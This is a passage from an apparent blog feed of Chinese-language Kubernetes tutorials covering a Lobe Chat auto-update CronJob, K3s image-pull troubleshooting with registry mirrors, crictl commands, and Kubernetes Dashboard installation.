class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-update</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-comment"># 使用 Cron 表达式定义任务的执行时间</span><br>  <span class="hljs-comment"># 这里是每天凌晨 3 点执行</span><br>  <span class="hljs-attr">schedule:</span> <span class="hljs-string">&quot;0 3 * * *&quot;</span><br>  <span class="hljs-attr">successfulJobsHistoryLimit:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">failedJobsHistoryLimit:</span> <span class="hljs-number">1</span><br>  <span class="hljs-comment"># 定义任务的模板</span><br>  <span class="hljs-attr">jobTemplate:</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">ttlSecondsAfterFinished:</span> <span class="hljs-number">3600</span>  <span class="hljs-comment"># Job 完成1小时后自动删除</span><br>      <span class="hljs-attr">template:</span><br>        <span class="hljs-attr">spec:</span><br>          <span class="hljs-comment"># 指定要使用的 ServiceAccount，这里是 lobe-chat-updater</span><br>          <span class="hljs-attr">serviceAccountName:</span> <span class="hljs-string">lobe-chat-updater</span><br>          <br>          <span class="hljs-comment"># 设置容器的重启策略，这里是 OnFailure，表示任务失败时重启容器</span><br>          <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">OnFailure</span><br>          <br>          <span class="hljs-comment"># 定义任务中要运行的容器</span><br>          <span class="hljs-attr">containers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">lobe-chat-updater</span><br>            <span class="hljs-attr">image:</span> <span class="hljs-string">bitnami/kubectl:1.23.0</span>  <span class="hljs-comment"># 使用 bitnami/kubectl 镜像，该镜像包含 kubectl 工具</span><br>            <span class="hljs-attr">imagePullPolicy:</span> <span class="hljs-string">IfNotPresent</span>  <span class="hljs-comment"># 使用固定版本的镜像</span><br>            <br>            <span class="hljs-comment"># 定义容器启动时要执行的命令</span><br>            <span class="hljs-comment"># 这里使用 kubectl 来触发 lobe-chat-deployment 的滚动更新</span><br>            <span class="hljs-attr">command:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">/bin/sh</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">-c</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">|</span><br><span class="hljs-string">              kubectl rollout restart deployment/lobe-chat-deployment</span><br><span class="hljs-string"></span>            <br>            <span class="hljs-comment"># 为容器设置资源请求和限制，确保它不会消耗过多的集群资源</span><br>            <span class="hljs-attr">resources:</span><br>              <span class="hljs-attr">limits:</span><br>                <span class="hljs-attr">cpu:</span> <span class="hljs-string">&quot;100m&quot;</span>  <span class="hljs-comment"># 限制最多使用 100 毫核的 CPU</span><br>                <span class="hljs-attr">memory:</span> <span class="hljs-string">&quot;128Mi&quot;</span>  <span class="hljs-comment"># 限制最多使用 128 MiB 的内存</span><br>              <span class="hljs-attr">requests:</span><br>                <span class="hljs-attr">cpu:</span> <span class="hljs-string">&quot;50m&quot;</span>  <span class="hljs-comment"># 容器启动时请求 50 毫核的 CPU</span><br>                <span class="hljs-attr">memory:</span> <span class="hljs-string">&quot;64Mi&quot;</span>  <span class="hljs-comment"># 容器启动时请求 64 MiB 的内存</span><br></code></pre></td></tr></table></figure><h2 id="步骤-2-部署-Lobe-Chat"><a href="#步骤-2-部署-Lobe-Chat" class="headerlink" title="步骤 2: 部署 Lobe Chat"></a>步骤 2: 部署 Lobe Chat</h2><p>使用以下命令应用 <code>lobe.yaml</code> 配置:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f lobe.yaml<br></code></pre></td></tr></table></figure><p>这将创建一个 ConfigMap、一个包含 3 个副本的 Deployment 和一个 LoadBalancer 类型的 Service。</p><h2 id="步骤-3-设置自动更新"><a href="#步骤-3-设置自动更新" class="headerlink" title="步骤 3: 设置自动更新"></a>步骤 3: 设置自动更新</h2><p>应用 <code>lobe-update.yaml</code> 配置:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f lobe-update.yaml<br></code></pre></td></tr></table></figure><p>这将创建一个 CronJob,每天凌晨 3 点自动更新 Lobe Chat 部署。</p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><ol><li><strong>ConfigMap</strong>: 存储所有必要的环境变量和 API 密钥。</li><li><strong>Deployment</strong>: 定义 Lobe Chat 应用的部署配置,包括副本数、容器镜像等。</li><li><strong>Service</strong>: 创建一个 LoadBalancer 类型的服务,使 Lobe Chat 可以从集群外部访问。</li><li><strong>ServiceAccount, Role, RoleBinding</strong>: 为自动更新任务创建必要的权限。</li><li><strong>CronJob</strong>: 定期执行滚动更新,确保始终使用最新的 Lobe Chat 镜像。</li></ol><h2 id="外部访问"><a href="#外部访问" class="headerlink" title="外部访问"></a>外部访问</h2><p>查看Service</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># kubectl get svc                                                                                                                                                      </span><br><span class="hljs-attribute">NAME</span>                TYPE           CLUSTER-IP     EXTERNAL-IP                                PORT(S)          AGE                                                                          <br><span class="hljs-attribute">kubernetes</span>          ClusterIP      <span class="hljs-number">10.43.0.1</span>                                           <span class="hljs-number">443</span>/TCP          <span class="hljs-number">14</span>d                                                                          <br><span class="hljs-attribute">lobe</span>-chat-service   LoadBalancer   <span class="hljs-number">10.43.154.41</span>   <span class="hljs-number">172.27.177.79</span>,<span class="hljs-number">172.31.18.43</span>,<span class="hljs-number">172.31.30.122</span>   <span class="hljs-number">3210</span>:<span class="hljs-number">32156</span>/TCP   <span class="hljs-number">14</span>d<br></code></pre></td></tr></table></figure><p>因为多个网络接口，导致有多个外部 IP 地址</p><p>通过<a href="http://your_ip:3210即可访问到服务">http://your_ip:3210即可访问到服务</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用-Kubernetes-搭建-Lobe-Chat-并实现自动化更新&quot;&gt;&lt;a href=&quot;#使用-Kubernetes-搭建-Lobe-Chat-并实现自动化更新&quot; class=&quot;headerlink&quot; title=&quot;使用 Kubernetes 搭建 Lobe </summary>
      
    
    
    
    
    <category term="Kubernetes" scheme="http://example.com/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes镜像拉取失败问题的排查与解决</title>
    <link href="http://example.com/2024/09/21/Kubernetes%E9%95%9C%E5%83%8F%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%92%E6%9F%A5%E4%B8%8E%E8%A7%A3%E5%86%B3/"/>
    <id>http://example.com/2024/09/21/Kubernetes%E9%95%9C%E5%83%8F%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E7%9A%84%E6%8E%92%E6%9F%A5%E4%B8%8E%E8%A7%A3%E5%86%B3/</id>
    <published>2024-09-21T09:06:31.000Z</published>
    <updated>2024-09-21T09:11:07.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Kubernetes镜像拉取失败问题的排查与解决"><a href="#Kubernetes镜像拉取失败问题的排查与解决" class="headerlink" title="Kubernetes镜像拉取失败问题的排查与解决"></a>Kubernetes镜像拉取失败问题的排查与解决</h1><h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>今天发现有个服务没有正常更新，检查之后发现ConJob执行失败。检查发现Pod状态显示为<code>ImagePullBackOff</code>。具体来说,在尝试拉取<code>bitnami/kubectl:1.23.0</code>镜像时,Pod一直无法正常启动,日志中提示网络超时错误。</p><h2 id="错误分析"><a href="#错误分析" class="headerlink" title="错误分析"></a>错误分析</h2><p>通过<code>kubectl get pods</code>命令,看到部分Pod状态为<code>ImagePullBackOff</code>或<code>ErrImagePull</code>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@Aliyun-<span class="hljs-number">4</span>G:~# kubectl get <span class="hljs-literal">all</span>                                                                                                                                                          <br><span class="hljs-attribute">NAME</span>                                        READY   STATUS             RESTARTS   AGE                                                                                                      <br><span class="hljs-attribute">pod</span>/cleanup-replicasets-<span class="hljs-number">28781040</span>-<span class="hljs-number">7</span>dbv2      <span class="hljs-number">0</span>/<span class="hljs-number">1</span>     ImagePullBackOff   <span class="hljs-number">0</span>          <span class="hljs-number">11</span>h                                                                                                      <br><span class="hljs-attribute">pod</span>/lobe-chat-deployment-<span class="hljs-number">85</span>fdcc486d-<span class="hljs-number">2</span>vd75   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running            <span class="hljs-number">0</span>          <span class="hljs-number">9</span>d                                                                                                       <br><span class="hljs-attribute">pod</span>/lobe-chat-deployment-<span class="hljs-number">85</span>fdcc486d-h55xf   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running            <span class="hljs-number">0</span>          <span class="hljs-number">9</span>d                                                                                                       <br><span class="hljs-attribute">pod</span>/lobe-chat-deployment-<span class="hljs-number">85</span>fdcc486d-sz24n   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>     Running            <span class="hljs-number">0</span>          <span class="hljs-number">9</span>d                                                                                                       <br><span class="hljs-attribute">pod</span>/lobe-chat-update-<span class="hljs-number">28768020</span>-<span class="hljs-number">9</span>vvkr         <span class="hljs-number">0</span>/<span class="hljs-number">1</span>     Completed          <span class="hljs-number">0</span>          <span class="hljs-number">9</span>d                                                                                                       <br><span class="hljs-attribute">pod</span>/lobe-chat-update-<span class="hljs-number">28780980</span>-<span class="hljs-number">86</span>qwf         <span class="hljs-number">0</span>/<span class="hljs-number">1</span>     ImagePullBackOff   <span class="hljs-number">0</span>          <span class="hljs-number">12</span>h    <br></code></pre></td></tr></table></figure><p>进一步使用<code>kubectl describe pod &lt;pod-name&gt;</code>查看Pod事件日志,发现如下错误信息:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">Warning</span> Failed Failed <span class="hljs-keyword">to</span> pull image <span class="hljs-string">&quot;bitnami/kubectl:1.23.0&quot;</span>: failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span> request: Head <span class="hljs-string">&quot;https://registry-1.docker.io/v2/bitnami/kubectl/manifests/1.23.0&quot;</span>: dial tcp: i/o timeout<br></code></pre></td></tr></table></figure><p>这说明K3s在从docker.io拉取镜像时遇到了网络连接超时问题。</p><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><h3 id="1-网络连接测试"><a href="#1-网络连接测试" class="headerlink" title="1. 网络连接测试"></a>1. 网络连接测试</h3><p>首先,我们使用<code>curl</code>命令测试节点到Docker Hub的网络连接:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v https://registry-1.docker.io/v2/<br></code></pre></td></tr></table></figure><p>结果请求超时,初步判断节点无法正常访问Docker Hub仓库。</p><h3 id="2-本地Docker测试"><a href="#2-本地Docker测试" class="headerlink" title="2. 本地Docker测试"></a>2. 本地Docker测试</h3><p>为了进一步确认问题,尝试在节点上使用Docker手动拉取镜像:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull bitnami/kubectl:1.23.0<br></code></pre></td></tr></table></figure><p>但镜像成功拉取了。这表明节点本地Docker与Docker Hub之间的网络是通的。</p><p>查询后发现K3s 使用的是轻量级的容器运行时 <code>containerd</code>，而传统的 Docker 使用的是 <code>dockerd</code>。尽管它们都是用于运行容器的工具，但它们的镜像存储路径和运行方式有所不同，因此 Docker 和 K3s 的镜像并不共享。而我的docker配置了镜像加速，而k3s使用的默认镜像源。</p><h3 id="3-containerd镜像检查"><a href="#3-containerd镜像检查" class="headerlink" title="3. containerd镜像检查"></a>3. containerd镜像检查</h3><p>使用<code>crictl images</code>命令检查K3s的containerd是否已拉取镜像:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl images<br></code></pre></td></tr></table></figure><p>结果显示containerd中并没有成功拉取所需镜像</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>为containerd配置镜像加速器来解决这个问题。具体步骤如下:</p><ol><li>编辑K3s的containerd配置文件:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/rancher/k3s/registries.yaml<br></code></pre></td></tr></table></figure><ol start="2"><li>添加以下内容,配置多个国内镜像加速器:</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">mirrors:</span><br>  <span class="hljs-attr">&quot;docker.io&quot;:</span><br>    <span class="hljs-attr">endpoint:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;https://dockerproxy.cn/&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;https://dockerproxy.com&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;https://docker.nju.edu.cn&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>重启K3s服务使配置生效:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl restart k3s<br></code></pre></td></tr></table></figure><ol start="4"><li>验证解决效果:<br>重新部署之前失败的Pod,观察是否能够成功拉取镜像并启动。</li></ol><p>或者看能否直接拉取镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">crictl</span> pull docker.io/bitnami/kubectl:<span class="hljs-number">1</span>.<span class="hljs-number">23</span>.<span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Kubernetes镜像拉取失败问题的排查与解决&quot;&gt;&lt;a href=&quot;#Kubernetes镜像拉取失败问题的排查与解决&quot; class=&quot;headerlink&quot; title=&quot;Kubernetes镜像拉取失败问题的排查与解决&quot;&gt;&lt;/a&gt;Kubernetes镜像拉取</summary>
      
    
    
    
    
    <category term="Kubernetes" scheme="http://example.com/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>crictl 命令使用及示例解析</title>
    <link href="http://example.com/2024/09/21/crictl-%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%A4%BA%E4%BE%8B%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2024/09/21/crictl-%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%A4%BA%E4%BE%8B%E8%A7%A3%E6%9E%90/</id>
    <published>2024-09-21T09:06:14.000Z</published>
    <updated>2024-09-21T11:46:37.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="crictl-命令使用及示例解析"><a href="#crictl-命令使用及示例解析" class="headerlink" title="crictl 命令使用及示例解析"></a>crictl 命令使用及示例解析</h2><h2 id="crictl-是什么？"><a href="#crictl-是什么？" class="headerlink" title="crictl 是什么？"></a><strong>crictl 是什么？</strong></h2><p>crictl 是一个命令行工具，用于与 Kubernetes 节点上的容器运行时接口 (CRI) 进行交互。它允许你检查和管理节点上的 Pod、容器、镜像等资源。</p><h2 id="1-镜像管理"><a href="#1-镜像管理" class="headerlink" title="1. 镜像管理"></a>1. 镜像管理</h2><h3 id="列出所有镜像"><a href="#列出所有镜像" class="headerlink" title="列出所有镜像"></a>列出所有镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl images<br></code></pre></td></tr></table></figure><p>显示所有已下载的容器镜像。</p><h3 id="拉取新镜像"><a href="#拉取新镜像" class="headerlink" title="拉取新镜像"></a>拉取新镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl pull nginx:latest<br></code></pre></td></tr></table></figure><p>从默认的镜像仓库下载最新的 nginx 镜像。</p><h3 id="删除特定镜像"><a href="#删除特定镜像" class="headerlink" title="删除特定镜像"></a>删除特定镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl rmi nginx:latest<br></code></pre></td></tr></table></figure><p>删除 nginx:latest 镜像。</p><h3 id="删除所有未使用的镜像"><a href="#删除所有未使用的镜像" class="headerlink" title="删除所有未使用的镜像"></a>删除所有未使用的镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl rmi --prune<br></code></pre></td></tr></table></figure><p>删除所有未被容器使用的镜像，节省磁盘空间。</p><h2 id="2-容器管理"><a href="#2-容器管理" class="headerlink" title="2. 容器管理"></a>2. 容器管理</h2><h3 id="列出所有运行中的容器"><a href="#列出所有运行中的容器" class="headerlink" title="列出所有运行中的容器"></a>列出所有运行中的容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl ps<br></code></pre></td></tr></table></figure><p>只显示正在运行的容器。</p><h3 id="列出所有容器（包括已停止的）"><a href="#列出所有容器（包括已停止的）" class="headerlink" title="列出所有容器（包括已停止的）"></a>列出所有容器（包括已停止的）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl ps -a<br></code></pre></td></tr></table></figure><p>显示所有容器，包括已停止的。</p><h3 id="启动一个已存在的容器"><a href="#启动一个已存在的容器" class="headerlink" title="启动一个已存在的容器"></a>启动一个已存在的容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl start &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>使用容器 ID 启动一个已创建但未运行的容器。</p><h3 id="停止一个运行中的容器"><a href="#停止一个运行中的容器" class="headerlink" title="停止一个运行中的容器"></a>停止一个运行中的容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl stop &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>优雅地停止一个正在运行的容器。</p><h3 id="强制停止容器"><a href="#强制停止容器" class="headerlink" title="强制停止容器"></a>强制停止容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl stop -t 0 &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>立即停止容器，不等待优雅关闭。</p><h3 id="删除一个容器"><a href="#删除一个容器" class="headerlink" title="删除一个容器"></a>删除一个容器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl <span class="hljs-built_in">rm</span> &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>删除一个已停止的容器。</p><h2 id="3-Pod-管理（主要用于-Kubernetes-环境）"><a href="#3-Pod-管理（主要用于-Kubernetes-环境）" class="headerlink" title="3. Pod 管理（主要用于 Kubernetes 环境）"></a>3. Pod 管理（主要用于 Kubernetes 环境）</h2><h3 id="列出所有-Pods"><a href="#列出所有-Pods" class="headerlink" title="列出所有 Pods"></a>列出所有 Pods</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl pods<br></code></pre></td></tr></table></figure><p>显示所有的 Pods。</p><h3 id="创建一个新的-Pod"><a href="#创建一个新的-Pod" class="headerlink" title="创建一个新的 Pod"></a>创建一个新的 Pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl runp pod-config.json<br></code></pre></td></tr></table></figure><p>根据 JSON 配置文件创建一个新的 Pod。</p><h3 id="停止一个-Pod"><a href="#停止一个-Pod" class="headerlink" title="停止一个 Pod"></a>停止一个 Pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl stopp &lt;pod-id&gt;<br></code></pre></td></tr></table></figure><p>停止指定 ID 的 Pod。</p><h3 id="删除一个-Pod"><a href="#删除一个-Pod" class="headerlink" title="删除一个 Pod"></a>删除一个 Pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl rmp &lt;pod-id&gt;<br></code></pre></td></tr></table></figure><p>删除指定 ID 的 Pod。</p><h2 id="4-容器操作和调试"><a href="#4-容器操作和调试" class="headerlink" title="4. 容器操作和调试"></a>4. 容器操作和调试</h2><h3 id="在运行中的容器内执行命令"><a href="#在运行中的容器内执行命令" class="headerlink" title="在运行中的容器内执行命令"></a>在运行中的容器内执行命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl <span class="hljs-built_in">exec</span> -i -t &lt;container-id&gt; <span class="hljs-built_in">ls</span> /<br></code></pre></td></tr></table></figure><p>在指定容器中交互式地执行 ‘ls &#x2F;‘ 命令。</p><h3 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl logs &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>显示指定容器的日志输出。</p><h3 id="查看容器详细信息"><a href="#查看容器详细信息" class="headerlink" title="查看容器详细信息"></a>查看容器详细信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl inspect &lt;container-id&gt;<br></code></pre></td></tr></table></figure><p>显示容器的详细配置和状态信息。</p><h3 id="查看容器资源使用统计"><a href="#查看容器资源使用统计" class="headerlink" title="查看容器资源使用统计"></a>查看容器资源使用统计</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl stats<br></code></pre></td></tr></table></figure><p>实时显示所有容器的 CPU、内存等资源使用情况。</p><h2 id="5-系统信息"><a href="#5-系统信息" class="headerlink" title="5. 系统信息"></a>5. 系统信息</h2><h3 id="查看-crictl-版本"><a href="#查看-crictl-版本" class="headerlink" title="查看 crictl 版本"></a>查看 crictl 版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl version<br></code></pre></td></tr></table></figure><p>显示 crictl 客户端和服务器的版本信息。</p><h3 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crictl info<br></code></pre></td></tr></table></figure><p>显示容器运行时的详细系统信息。</p><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><ul><li>使用 <code>crictl -h</code> 或 <code>crictl &lt;command&gt; -h</code> 可以查看具体命令的帮助信息。</li><li>大多数命令支持使用 <code>-o json</code> 选项来输出 JSON 格式的结果，方便进行进一步处理。</li><li>在执行危险操作前，可以先使用 <code>--dry-run</code> 选项来模拟操作，查看会产生什么结果。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;crictl-命令使用及示例解析&quot;&gt;&lt;a href=&quot;#crictl-命令使用及示例解析&quot; class=&quot;headerlink&quot; title=&quot;crictl 命令使用及示例解析&quot;&gt;&lt;/a&gt;crictl 命令使用及示例解析&lt;/h2&gt;&lt;h2 id=&quot;crictl-是什</summary>
      
    
    
    
    
    <category term="Kubernetes" scheme="http://example.com/tags/Kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes Dashboard安装教程</title>
    <link href="http://example.com/2024/08/01/Kubernetes-Dashboard%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <id>http://example.com/2024/08/01/Kubernetes-Dashboard%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</id>
    <published>2024-08-01T11:44:17.000Z</published>
    <updated>2024-09-01T11:50:06.096Z</updated>
    
    <content type="html"><![CDATA[<p>好的,我来为您整理一篇安装Kubernetes Dashboard的教程。以下是教程内容:</p><h1 id="Kubernetes-Dashboard安装教程"><a href="#Kubernetes-Dashboard安装教程" class="headerlink" title="Kubernetes Dashboard安装教程"></a>Kubernetes Dashboard安装教程</h1><p>Kubernetes Dashboard是一个基于网页的Kubernetes集群管理界面。在Kubernetes集群中安装和配置Kubernetes Dashboard。</p><h2 id="1-安装Kubernetes-Dashboard"><a href="#1-安装Kubernetes-Dashboard" class="headerlink" title="1. 安装Kubernetes Dashboard"></a>1. 安装Kubernetes Dashboard</h2><p>首先,我们需要应用Kubernetes Dashboard的配置文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f kubernetes-dashboard.yaml<br></code></pre></td></tr></table></figure><p>注意:<code>kubernetes-dashboard.yaml</code>文件可以从<a href="https://github.com/AliyunContainerService/k8s-for-docker-desktop/tree/v1.29.2">官方仓库</a>获取，注意根据自己版本进行选择。</p><h2 id="2-检查安装状态"><a href="#2-检查安装状态" class="headerlink" title="2. 检查安装状态"></a>2. 检查安装状态</h2><p>安装完成后,检查Kubernetes Dashboard的运行状态:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get pod -n kubernetes-dashboard<br></code></pre></td></tr></table></figure><p>如果看到状态为”Running”,则说明安装成功。</p><h2 id="3-启动API-Server代理"><a href="#3-启动API-Server代理" class="headerlink" title="3. 启动API Server代理"></a>3. 启动API Server代理</h2><p>为了访问Dashboard,我们需要启动Kubernetes API Server的代理:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl proxy<br></code></pre></td></tr></table></figure><p>此命令会在本地启动一个代理服务器。</p><h2 id="4-访问Dashboard"><a href="#4-访问Dashboard" class="headerlink" title="4. 访问Dashboard"></a>4. 访问Dashboard</h2><p>现在,您可以通过以下URL访问Kubernetes Dashboard:</p><p><a href="http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/">http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/</a></p><h2 id="5-配置访问令牌"><a href="#5-配置访问令牌" class="headerlink" title="5. 配置访问令牌"></a>5. 配置访问令牌</h2><p>为了安全起见,我们需要配置访问令牌。首先,授权<code>kube-system</code>命名空间的默认服务账号:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f kube-system-default.yaml<br></code></pre></td></tr></table></figure><p>注意:请确保您已经准备好了<code>kube-system-default.yaml</code>文件。</p><p>然后,在Windows环境中,执行以下命令生成访问令牌:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$TOKEN</span>=((kubectl <span class="hljs-literal">-n</span> kube<span class="hljs-literal">-system</span> describe secret default | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;token:&quot;</span>) <span class="hljs-operator">-split</span> <span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">1</span>]<br>kubectl config <span class="hljs-built_in">set-credentials</span> docker<span class="hljs-literal">-desktop</span> <span class="hljs-literal">--token</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$</span>&#123;TOKEN&#125;&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$TOKEN</span><br></code></pre></td></tr></table></figure><p>请保存生成的令牌,您将需要使用它来登录Dashboard。</p><h2 id="6-安装metrics-server-可选"><a href="#6-安装metrics-server-可选" class="headerlink" title="6. 安装metrics-server (可选)"></a>6. 安装metrics-server (可选)</h2><p>在Dashboard中查看CPU和内存使用情况,需要安装metrics-server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml<br></code></pre></td></tr></table></figure><p>安装完成后,可能需要编辑metrics-server的部署配置,添加一些参数以解决可能出现的问题:</p><figure class="highlight bash"><table><tr><td 